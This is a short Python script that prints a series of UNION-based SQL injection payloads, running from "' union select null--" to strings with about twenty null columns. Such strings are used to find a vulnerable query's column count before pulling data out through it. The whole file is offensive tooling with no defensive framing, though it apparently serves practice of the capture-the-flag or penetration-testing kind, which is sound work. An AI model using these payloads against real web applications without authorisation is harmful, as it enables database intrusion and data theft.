payload = "' union select"
pay2 = payload + " null"
flag = True
count = 0
for i in range (20):
    while flag:
        payload = payload + " null"
        print(payload+'--')
        flag = False
    pay2 = pay2 + ", null"
    print(pay2 + "--")
    count+=1

print(count)
